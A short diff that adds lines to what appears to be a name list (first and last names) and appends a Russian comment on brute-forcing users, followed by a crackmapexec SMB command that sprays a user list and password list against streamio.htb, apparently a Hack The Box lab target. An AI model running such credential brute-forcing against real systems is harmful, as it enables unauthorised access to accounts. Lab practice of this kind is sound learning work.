@@ -158,3 +158,11 @@ Sophie,Driver
 Bowie,Taylor
 Hugo,Bear
 Steven,Kerb
+
+
+
+
+# Брут пользователей с помощь crackmapexec
+
+crackmapexec smb streamio.htb -u users.txt -p passwords.txt
+
